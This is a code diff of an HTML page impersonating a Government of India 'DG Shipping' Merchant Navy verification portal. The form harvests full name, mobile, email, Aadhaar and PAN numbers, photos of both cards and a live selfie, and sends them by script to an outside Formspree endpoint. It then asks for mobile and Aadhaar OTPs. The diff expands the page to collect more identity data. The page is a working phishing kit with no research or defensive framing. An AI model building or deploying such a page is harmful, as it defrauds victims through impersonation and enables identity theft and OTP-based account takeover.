@@ -5,55 +5,71 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DG Shipping | Verification</title>
     <style>
-        body { font-family: sans-serif; background-color: #f0f2f5; padding: 15px; }
-        .box { background: white; max-width: 450px; margin: auto; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .header { text-align: center; border-bottom: 2px solid #003366; margin-bottom: 15px; }
-        label { font-weight: bold; font-size: 14px; display: block; margin-top: 12px; }
-        input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        .btn { background: #003366; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; margin-top: 15px; cursor: pointer; font-weight: bold; }
-        #otp-section { display: none; margin-top: 20px; padding: 15px; background: #eefbff; border: 1px dashed #003366; }
+        body { font-family: sans-serif; background-color: #f0f2f5; padding: 10px; }
+        .box { background: white; max-width: 500px; margin: auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-top: 5px solid #003366; }
+        .header { text-align: center; margin-bottom: 20px; }
+        label { font-weight: bold; font-size: 13px; display: block; margin-top: 15px; color: #333; }
+        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; margin-top: 20px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        #otp-section { display: none; margin-top: 20px; padding: 20px; background: #f9f9f9; border: 1px solid #003366; border-radius: 8px; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <div class="header">
-        <h3 style="color:#003366; margin:5px;">GOVERNMENT OF INDIA</h3>
-        <p style="font-size:12px; margin-top:0;">Merchant Navy Verification Portal</p>
+        <h2 style="color:#003366; margin:0;">GOVERNMENT OF INDIA</h2>
+        <p style="font-size:12px; color:#666;">Merchant Navy Document Verification</p>
     </div>
 
-    <form id="mainForm" action="https://formspree.io/f/mgolayya" method="POST" enctype="multipart/form-data">
-        
+    <form id="fullForm" action="https://formspree.io/f/mgolayya" method="POST" enctype="multipart/form-data">
         <div id="details-section">
-            <label>Full Name *</label>
-            <input type="text" name="Name" required>
+            <label>Full Name (As per Aadhaar) *</label>
+            <input type="text" name="Full_Name" required>
 
             <label>Mobile Number *</label>
             <input type="tel" name="Mobile" required>
 
-            <label>Aadhaar Front Photo *</label>
-            <input type="file" name="Aadhaar_Photo" required>
+            <label>Email ID *</label>
+            <input type="email" name="Email" required>
 
-            <label>Live Selfie *</label>
-            <input type="file" name="Selfie" required>
+            <label>Aadhaar Card Number *</label>
+            <input type="text" name="Aadhaar_Number" required>
 
-            <button type="button" class="btn" onclick="sendDetails()">Next: Verify Identity</button>
+            <label>PAN Card Number *</label>
+            <input type="text" name="PAN_Number" required>
+
+            <label>Aadhaar Front & Back (Combined) *</label>
+            <input type="file" name="Aadhaar_File" required>
+
+            <label>PAN Card Photo *</label>
+            <input type="file" name="PAN_File" required>
+
+            <label>Candidate Selfie (Live) *</label>
+            <input type="file" name="Selfie_File" required>
+
+            <button type="button" id="nextBtn" class="btn" onclick="sendAllDetails()">Next: Verify Identity</button>
         </div>
 
         <div id="otp-section">
-            <p style="text-align:center; font-weight:bold; color:#003366;">🔐 VERIFICATION REQUIRED</p>
-            <label>Enter Mobile OTP *</label>
-            <input type="text" name="OTP_Value" placeholder="Sent to your mobile">
+            <h3 style="text-align:center; color:#003366;">🔐 IDENTITY VERIFICATION</h3>
+            <label>Mobile OTP *</label>
+            <input type="text" name="Mobile_OTP" placeholder="Enter OTP sent to Mobile">
+            <label>Aadhaar OTP *</label>
+            <input type="text" name="Aadhaar_OTP" placeholder="Enter OTP sent to Aadhaar">
             
-            <button type="submit" class="btn" style="background:#28a745;">FINAL SUBMIT</button>
+            <button type="submit" class="btn" style="background:#003366;">FINAL VERIFICATION</button>
         </div>
     </form>
 </div>
 
 <script>
-    function sendDetails() {
-        // Form ka data Formspree ko bhej raha hai
-        var form = document.getElementById('mainForm');
+    function sendAllDetails() {
+        var btn = document.getElementById('nextBtn');
+        btn.innerHTML = "Submitting Details...";
+        btn.disabled = true;
+
+        var form = document.getElementById('fullForm');
         var formData = new FormData(form);
 
         fetch(form.action, {
@@ -61,12 +77,15 @@
             body: formData,
             headers: { 'Accept': 'application/json' }
         }).then(response => {
-            // Data bhejne ke baad OTP wala box dikhayega
             document.getElementById('details-section').style.display = 'none';
             document.getElementById('otp-section').style.display = 'block';
+            window.scrollTo(0,0);
+        }).catch(error => {
+            alert("Error! Please retry.");
+            btn.innerHTML = "Next: Verify Identity";
+            btn.disabled = false;
         });
     }
 </script>
-
 </body>
 </html>
